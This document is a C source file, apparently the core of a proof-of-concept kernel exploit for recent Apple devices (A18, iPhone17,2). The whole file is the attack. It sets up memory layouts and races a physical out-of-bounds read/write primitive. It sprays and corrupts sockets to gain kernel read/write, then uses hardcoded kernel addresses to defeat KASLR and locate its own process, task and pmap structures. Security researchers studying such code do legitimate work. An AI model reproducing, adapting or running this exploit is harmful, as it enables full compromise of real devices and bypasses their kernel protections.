#include "poc.h"

#include <mach-o/dyld.h>
#include <mach/mach_time.h>
#include <pthread.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "agx.h"
#include "free_thread.h"
#include "kmem.h"
#include "krw.h"
#include "phys_oob.h"
#include "socket.h"
#include "surface.h"
#include "utils.h"

offsets_t g_offsets;
pe_context_t g_ctx;

// A18 pe_v3 ported from kolbicz/Cyanide commit 13ad360b3e7d2ec4bfe0c4a703cc85a6cea46e71.
#define PE_V3_WIRED_BYTES (2ULL * 1024 * 1024 * 1024)
#define PE_V3_SEARCH_PAGES 0x800ULL
#define PE_V3_MIN_WIRED_PAGES 4096
#define PE_V3_MLOCK_FAILURE_LIMIT 64
#define PE_V3_SEARCH_SURFACE_RESERVE 2048
#define PE_V3_MAX_FIXED_ALLOC_PROBES (1U << 20)
#define PE_V3_MAX_FREED_PAGES 64
#define PE_V3_BATCH_PAGES 8
#define PE_V3_BATCH_ROUNDS 3
#define PE_V3_PROVEN_CYCLES 20
#define PE_V3_LAYOUT_ATTEMPTS 3
#define PE_V3_FOREIGN_READ_LIMIT 20
#define PE_V3_MIN_SOCKETS_PER_PAGE 128
#define PE_V3_SETTLE_SECONDS 3
#define PE_V3_DEALLOC_PACE 2048
#define STATIC_KERNEL_BASE 0xfffffff007004000ULL
#define STATIC_RIPCBINFO 0xfffffff00ae6a790ULL  // raw_ip.c rip_attach, iPhone17,2 22G100

static bool g_pe_v3_hunt_budget_hit;

static kern_return_t stop_early_krw(const char* reason) {
    LOG_ERR("%s", reason);
    bool parked = krw_park_transport();
    bool pinned = parked && krw_sockets_leak_forever();
    g_ctx.transport_unsafe = true;
    if (parked && pinned) {
        LOG_ERR("KRW transport parked and pinned; reboot before retrying");
    } else {
        LOG_ERR("KRW transport could not be secured; reboot now");
    }
    return KERN_FAILURE;
}

static void pe_stop_free_thread(void) {
    if (!g_ctx.free_thread_started) return;
    atomic_store_explicit(&g_ctx.shared->stop_sync, 1, memory_order_seq_cst);
    atomic_store_explicit(&g_ctx.shared->free_thread_start, 1, memory_order_seq_cst);
    atomic_store_explicit(&g_ctx.shared->go_sync, 1, memory_order_seq_cst);
    atomic_store_explicit(&g_ctx.shared->race_sync, 1, memory_order_seq_cst);
    pthread_join(g_ctx.free_thread, NULL);
    g_ctx.free_thread_started = false;
}

static kern_return_t pe_init(void) {
    init_target_file();
    if (g_ctx.read_fd < 0 || g_ctx.write_fd < 0) return KERN_FAILURE;

    uint32_t size = 0x1024;
    char* executable_path = calloc(1, size);
    if (executable_path == NULL) return KERN_RESOURCE_SHORTAGE;
    if (_NSGetExecutablePath(executable_path, &size) != 0) {
        free(executable_path);
        return KERN_FAILURE;
    }
    char* executable_name = strrchr(executable_path, '/');
    g_ctx.executable_name = strdup(executable_name ? executable_name + 1 : executable_path);
    free(executable_path);
    if (g_ctx.executable_name == NULL) return KERN_RESOURCE_SHORTAGE;

    g_ctx.shared = calloc(1, sizeof(*g_ctx.shared));
    if (g_ctx.shared == NULL) return KERN_RESOURCE_SHORTAGE;
    if (pthread_create(&g_ctx.free_thread, NULL, free_thread_worker, g_ctx.shared) != 0) {
        return KERN_FAILURE;
    }
    g_ctx.free_thread_started = true;
    return KERN_SUCCESS;
}

static size_t spray_socket_batch(size_t limit) {
    size_t before = g_ctx.socket_ports_count;
    while (g_ctx.socket_ports_count < limit) {
        if (spray_socket() == UINT64_MAX) break;
    }
    return g_ctx.socket_ports_count - before;
}

static bool scan_proven_batch(mach_port_t memory_object, const mach_vm_offset_t* offsets, size_t count, uint8_t* read_buffer, uint8_t* write_buffer, uint64_t* target_ids, size_t* target_count,
                              uint64_t* attempts) {
    for (unsigned round = 0; round < PE_V3_BATCH_ROUNDS; round++) {
        for (size_t idx = 0; idx < count; idx++) {
            (*attempts)++;
            if (find_and_corrupt_socket(memory_object, offsets[idx], read_buffer, write_buffer, target_ids, target_count, true) == KERN_SUCCESS) {
                return true;
            }
            if (g_ctx.race_failed) return false;
        }
        if (g_ctx.socket_ports_count >= MAX_SOCKETS_COUNT) break;
        size_t limit = g_ctx.socket_ports_count + MAX_SOCKETS_COUNT / PE_V3_BATCH_PAGES;
        if (limit > MAX_SOCKETS_COUNT) limit = MAX_SOCKETS_COUNT;
        if (spray_socket_batch(limit) == 0) break;
    }
    return false;
}

static bool cycle_proven_pages(mach_port_t memory_object, const mach_vm_offset_t* offsets, size_t count, uint8_t* read_buffer, uint8_t* write_buffer, uint64_t* target_ids, size_t* target_count,
                               uint64_t* attempts, uint64_t* cycles) {
    for (unsigned cycle = 0; cycle < PE_V3_PROVEN_CYCLES; cycle++) {
        (*cycles)++;
        LOG("pe_v3 reoccupation cycle %u/%u", cycle + 1, PE_V3_PROVEN_CYCLES);
        sockets_release();
        *target_count = 0;
        sleep(PE_V3_SETTLE_SECONDS);
        if (g_ctx.race_failed) break;
        if (spray_socket_batch(MAX_SOCKETS_COUNT / PE_V3_BATCH_PAGES) == 0) break;

        for (size_t base = 0; base < count; base += PE_V3_BATCH_PAGES) {
            size_t batch_count = count - base;
            if (batch_count > PE_V3_BATCH_PAGES) batch_count = PE_V3_BATCH_PAGES;
            if (scan_proven_batch(memory_object, offsets + base, batch_count, read_buffer, write_buffer, target_ids, target_count, attempts)) {
                return true;
            }
            if (g_ctx.race_failed) return false;
        }
    }
    return false;
}

static bool pe_v3(void) {
    g_pe_v3_hunt_budget_hit = false;
    socket_scan_stats_reset();
    bool acquired = false;
    bool socket_spray_failed = false;
    bool search_surface_locked = false;
    mach_port_t memory_object = MACH_PORT_NULL;
    mach_vm_address_t search_mapping = 0;
    mach_vm_size_t search_size = PE_V3_SEARCH_PAGES * vm_page_size;
    mach_vm_size_t page_size = vm_page_size;
    uint64_t page_count = PE_V3_WIRED_BYTES / page_size;
    uint64_t wired_count = 0;
    uint64_t wired_successes = 0;
    uint64_t consecutive_mlock_failures = 0;
    uint64_t hunt_reads = 0;
    uint64_t hunt_own = 0;
    uint64_t freed_pages = 0;
    uint64_t reoccupy_attempts = 0;
    uint64_t cycles = 0;
    size_t target_count = 0;

    uint8_t* read_buffer = calloc(1, g_ctx.oob_size);
    uint8_t* write_buffer = calloc(1, g_ctx.oob_size);
    mach_vm_address_t* wired_addrs = calloc(page_count, sizeof(*wired_addrs));
    mach_vm_address_t* seen_pages = calloc(4096, sizeof(*seen_pages));
    uint64_t* target_ids = calloc(MAX_SOCKETS_COUNT, sizeof(*target_ids));
    if (!read_buffer || !write_buffer || !wired_addrs || !seen_pages || !target_ids) {
        LOG_ERR("pe_v3 allocation failed");
        goto cleanup;
    }

    if (g_ctx.pc_object == MACH_PORT_NULL && initialize_physical_read_write(g_ctx.n_of_oob_pages * vm_page_size) != KERN_SUCCESS) {
        goto cleanup;
    }

    LOG("pe_v3 staging %llu pages", page_count);
    mach_vm_address_t wired_addr = 0;
    bool mlock_ceiling = false;
    for (uint64_t idx = 0; idx < page_count; idx++) {
        kern_return_t kr;
        if (idx == 0) {
            kr = mach_vm_allocate(mach_task_self(), &wired_addr, page_size, VM_FLAGS_ANYWHERE);
        } else {
            mach_vm_address_t next = wired_addrs[idx - 1] + page_size;
            kr = KERN_FAILURE;
            for (unsigned probe = 0; probe < PE_V3_MAX_FIXED_ALLOC_PROBES; probe++) {
                wired_addr = next;
                kr = mach_vm_allocate(mach_task_self(), &wired_addr, page_size, VM_FLAGS_FIXED);
                next += page_size;
                if (kr == KERN_SUCCESS) break;
            }
        }
        if (kr != KERN_SUCCESS) break;

        wired_addrs[idx] = wired_addr;
        wired_count = idx + 1;
        if (!mlock_ceiling) {
            if (surface_mlock(wired_addr, page_size) == KERN_SUCCESS) {
                wired_successes++;
                consecutive_mlock_failures = 0;
            } else if (++consecutive_mlock_failures >= PE_V3_MLOCK_FAILURE_LIMIT) {
                mlock_ceiling = true;
            }
        }
        *(uint64_t*)wired_addr = g_ctx.wired_page_marker;
        *(uint64_t*)(wired_addr + sizeof(uint64_t)) = wired_addr;
    }
    LOG("pe_v3 staged %llu/%llu pages; %llu IOSurface-wired", wired_count, page_count, wired_successes);
    if (wired_successes < PE_V3_MIN_WIRED_PAGES) {
        LOG_ERR("pe_v3 needs at least %u wired pages", PE_V3_MIN_WIRED_PAGES);
        goto cleanup;
    }

    if (mach_vm_allocate(mach_task_self(), &search_mapping, search_size, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR) != KERN_SUCCESS) {
        goto cleanup;
    }
    for (mach_vm_size_t offset = 0; offset < search_size; offset += page_size) {
        *(uint64_t*)(search_mapping + offset) = g_ctx.random_marker;
    }
    if (surface_mlock(search_mapping, search_size) != KERN_SUCCESS) {
        size_t released = surface_release_oldest(PE_V3_SEARCH_SURFACE_RESERVE);
        LOG("released %zu staging surfaces for the search mapping", released);
        if (released == 0 || surface_mlock(search_mapping, search_size) != KERN_SUCCESS) {
            LOG_ERR("could not wire the search mapping");
            goto cleanup;
        }
    }
    search_surface_locked = true;

    memory_object_size_t object_size = search_size;
    if (mach_make_memory_entry_64(mach_task_self(), &object_size, search_mapping, VM_PROT_DEFAULT, &memory_object, MACH_PORT_NULL) != KERN_SUCCESS) {
        goto cleanup;
    }

    if (spray_socket() == UINT64_MAX) {
        goto cleanup;
    }
    sockets_release();

    size_t seen_count = 0;
    mach_vm_offset_t batch_offsets[PE_V3_BATCH_PAGES] = {};
    mach_vm_offset_t proven_offsets[PE_V3_MAX_FREED_PAGES] = {};
    size_t batch_count = 0;
    size_t proven_count = 0;

    for (mach_vm_offset_t offset = 0; offset + g_ctx.pc_size <= search_size; offset += page_size) {
        if (hunt_reads - hunt_own >= PE_V3_FOREIGN_READ_LIMIT) {
            g_pe_v3_hunt_budget_hit = true;
            break;
        }
        if (physical_oob_read_mo(memory_object, offset, g_ctx.oob_size, g_ctx.oob_offset, read_buffer) != KERN_SUCCESS) {
            if (g_ctx.race_failed) {
                socket_spray_failed = true;
                break;
            }
            continue;
        }
        hunt_reads++;

        if (*(uint64_t*)read_buffer != g_ctx.wired_page_marker) {
            kern_return_t kr = find_and_corrupt_socket(memory_object, offset, read_buffer, write_buffer, target_ids, &target_count, false);
            if (kr == KERN_SUCCESS) {
                acquired = true;
                break;
            }
            if (g_ctx.race_failed) {
                socket_spray_failed = true;
                break;
            }
            continue;
        }

        hunt_own++;
        mach_vm_address_t wired_page = *(uint64_t*)(read_buffer + sizeof(uint64_t));
        bool duplicate = false;
        for (size_t idx = 0; idx < seen_count; idx++) {
            if (seen_pages[idx] == wired_page) {
                duplicate = true;
                break;
            }
        }
        if (duplicate) continue;
        if (seen_count < 4096) seen_pages[seen_count++] = wired_page;
        if (freed_pages >= PE_V3_MAX_FREED_PAGES) break;

        size_t tracked_idx = 0;
        while (tracked_idx < wired_count && wired_addrs[tracked_idx] != wired_page) {
            tracked_idx++;
        }
        if (tracked_idx == wired_count) continue;

        *(uint64_t*)wired_page = 0;
        *(uint64_t*)(wired_page + sizeof(uint64_t)) = 0;
        if (mach_vm_deallocate(mach_task_self(), wired_page, page_size) != KERN_SUCCESS) {
            continue;
        }
        wired_addrs[tracked_idx] = wired_addrs[--wired_count];
        freed_pages++;

        size_t before = g_ctx.socket_ports_count;
        size_t limit = before + MAX_SOCKETS_COUNT / PE_V3_BATCH_PAGES;
        if (limit > MAX_SOCKETS_COUNT) limit = MAX_SOCKETS_COUNT;
        size_t added = spray_socket_batch(limit);
        if (added < PE_V3_MIN_SOCKETS_PER_PAGE) {
            socket_spray_failed = true;
            break;
        }

        batch_offsets[batch_count++] = offset;
        proven_offsets[proven_count++] = offset;
        reoccupy_attempts++;
        if (find_and_corrupt_socket(memory_object, offset, read_buffer, write_buffer, target_ids, &target_count, true) == KERN_SUCCESS) {
            acquired = true;
            break;
        }
        if (g_ctx.race_failed) {
            socket_spray_failed = true;
            break;
        }
        if (batch_count < PE_V3_BATCH_PAGES) continue;
        if (scan_proven_batch(memory_object, batch_offsets, batch_count, read_buffer, write_buffer, target_ids, &target_count, &reoccupy_attempts)) {
            acquired = true;
            break;
        }
        if (g_ctx.race_failed) {
            socket_spray_failed = true;
            break;
        }
        batch_count = 0;
        if (g_ctx.socket_ports_count >= MAX_SOCKETS_COUNT) break;
    }

    if (!acquired && !socket_spray_failed && batch_count > 0) {
        acquired = scan_proven_batch(memory_object, batch_offsets, batch_count, read_buffer, write_buffer, target_ids, &target_count, &reoccupy_attempts);
        if (g_ctx.race_failed) socket_spray_failed = true;
    }
    if (!acquired && !socket_spray_failed && proven_count > 0 && hunt_reads - hunt_own <= PE_V3_FOREIGN_READ_LIMIT) {
        acquired = cycle_proven_pages(memory_object, proven_offsets, proven_count, read_buffer, write_buffer, target_ids, &target_count, &reoccupy_attempts, &cycles);
    }

cleanup:
    if (memory_object != MACH_PORT_NULL) {
        mach_port_deallocate(mach_task_self(), memory_object);
    }
    if (!g_ctx.transport_unsafe) sockets_release();
    if (search_surface_locked) surface_munlock(search_mapping);
    if (search_mapping != 0) {
        mach_vm_deallocate(mach_task_self(), search_mapping, search_size);
    }
    for (uint64_t idx = 0; idx < wired_count; idx++) {
        mach_vm_deallocate(mach_task_self(), wired_addrs[idx], page_size);
        if ((idx + 1) % PE_V3_DEALLOC_PACE == 0) usleep(1000);
    }
    surface_munlock_all();
    free(target_ids);
    free(seen_pages);
    free(wired_addrs);
    free(write_buffer);
    free(read_buffer);
    LOG("pe_v3 result=%s hunt_reads=%llu own=%llu freed=%llu attempts=%llu cycles=%llu", acquired ? "acquired" : "miss", hunt_reads, hunt_own, freed_pages, reoccupy_attempts, cycles);
    socket_scan_stats_log();
    return acquired;
}

static kern_return_t pe(agx_test_mode_t mode, uint64_t argument) {
    kern_return_t kr = pe_init();
    if (kr != KERN_SUCCESS) return kr;

    bool acquired = false;
    for (unsigned attempt = 0; attempt < PE_V3_LAYOUT_ATTEMPTS && !acquired && !g_ctx.race_failed; attempt++) {
        if (attempt != 0) {
            LOG("pe_v3 re-rolling layout %u/%u%s", attempt + 1, PE_V3_LAYOUT_ATTEMPTS,
                g_pe_v3_hunt_budget_hit ? " after foreign-read cap" : "");
        }
        acquired = pe_v3();
    }
    pe_stop_free_thread();
    physical_oob_cleanup();
    close(g_ctx.write_fd);
    close(g_ctx.read_fd);
    g_ctx.write_fd = -1;
    g_ctx.read_fd = -1;
    if (!acquired) return KERN_FAILURE;

    if (!krw_is_kernel_address(g_ctx.rw_socket_pcb)) return stop_early_krw("RW PCB is invalid");
    if (!krw_is_kernel_address(g_ctx.control_socket_pcb) &&
        (!early_kread64_checked(g_ctx.rw_socket_pcb + g_ctx.offsets.inpcb_inp_list_le_next, &g_ctx.control_socket_pcb) || !krw_is_kernel_address(g_ctx.control_socket_pcb))) {
        return stop_early_krw("control PCB read failed");
    }

    uint64_t pcbinfo = 0;
    if (!early_kread64_checked(g_ctx.control_socket_pcb + g_ctx.offsets.inpcb_inp_pcbinfo, &pcbinfo) || pcbinfo < STATIC_RIPCBINFO || !krw_is_kernel_address(pcbinfo)) {
        return stop_early_krw("ripcbinfo read failed");
    }
    uint64_t kernel_slide = pcbinfo - STATIC_RIPCBINFO;
    if ((kernel_slide & (vm_page_size - 1)) != 0) return stop_early_krw("kernel slide is not page-aligned");
    uint64_t kernel_base = STATIC_KERNEL_BASE + kernel_slide;

    uint64_t magic = 0;
    uint64_t header = 0;
    if (!early_kread64_checked(kernel_base, &magic) || !early_kread64_checked(kernel_base + 8, &header) || magic != 0x100000cfeedfacf || (header != 0xc00000002 && header != 0xb00000000)) {
        return stop_early_krw("kernel header verification failed");
    }

    g_ctx.kernel_base = kernel_base;
    g_ctx.kernel_slide = kernel_slide;

    uint64_t self_proc = find_self_proc();
    uint64_t self_task = task_from_proc(self_proc);
    uint64_t self_pmap = pmap_from_task(self_task);
    if (!self_proc || !self_task || !self_pmap) return stop_early_krw("kernel object traversal failed");

    g_ctx.self_proc = self_proc;
    g_ctx.self_task = self_task;
    g_ctx.self_pmap = self_pmap;
    LOG("self_proc=%#llx self_task=%#llx self_pmap=%#llx", self_proc, self_task, self_pmap);
    if (!krw_sockets_leak_forever()) return stop_early_krw("could not pin KRW sockets");
    g_ctx.transport_unsafe = true;
    LOG("AGX test mode=%s", agx_test_mode_name(mode));
    if (!agx_run_test(mode, argument)) {
        LOG_ERR("AGX %s test failed", agx_test_mode_name(mode));
        return KERN_FAILURE;
    }
    return KERN_SUCCESS;
}

int clearsword_run_test(agx_test_mode_t mode, uint64_t argument) {
    if (!agx_test_argument_valid(mode, argument)) {
        LOG_ERR("invalid argument for AGX test mode %s", agx_test_mode_name(mode));
        return -1;
    }

    mach_timebase_info_data_t timebase;
    mach_timebase_info(&timebase);
    uint64_t start = mach_absolute_time();

    memset(&g_offsets, 0, sizeof(g_offsets));
    memset(&g_ctx, 0, sizeof(g_ctx));
    g_ctx.read_fd = -1;
    g_ctx.write_fd = -1;
    g_ctx.control_socket = -1;
    g_ctx.rw_socket = -1;
    g_ctx.target_file_size = vm_page_size * 2;
    g_ctx.oob_offset = 0x100;
    g_ctx.oob_size = 0xf00;
    g_ctx.n_of_oob_pages = 2;
    g_ctx.oob_race_max_tries = 4000;

    arc4random_buf(&g_ctx.random_marker, sizeof(g_ctx.random_marker));
    arc4random_buf(&g_ctx.wired_page_marker, sizeof(g_ctx.wired_page_marker));
    g_ctx.default_file_content = calloc(1, g_ctx.target_file_size);
    if (!g_ctx.default_file_content) goto failure;
    memset_pattern8(g_ctx.default_file_content, &g_ctx.random_marker, g_ctx.target_file_size);

    if (offsets_init() != 0) goto failure;
    g_ctx.offsets = g_offsets;
    if (!agx_buffer_rw_self_test()) goto failure;
    if (pe(mode, argument) != KERN_SUCCESS) goto failure;

    double elapsed_ms = (double)(mach_absolute_time() - start) * timebase.numer / timebase.denom / 1e6;
    LOG("kernel_base: %#llx", g_ctx.kernel_base);
    LOG("kernel_slide: %#llx", g_ctx.kernel_slide);
    LOG("KRW acquired in %.3f ms", elapsed_ms);

    free(g_ctx.shared);
    free(g_ctx.default_file_content);
    free(g_ctx.executable_name);
    return 0;

failure:
    pe_stop_free_thread();
    physical_oob_cleanup();
    surface_munlock_all();
    if (!g_ctx.transport_unsafe) sockets_release();
    if (g_ctx.write_fd >= 0) close(g_ctx.write_fd);
    if (g_ctx.read_fd >= 0) close(g_ctx.read_fd);
    free(g_ctx.shared);
    free(g_ctx.default_file_content);
    free(g_ctx.executable_name);
    return g_ctx.transport_unsafe ? -2 : -1;
}

int clearsword_run(void) {
    return clearsword_run_test(AGX_TEST_SHADOW, 0);
}

int clearsword_run_mode(agx_test_mode_t mode) {
    return clearsword_run_test(mode, 0);
}
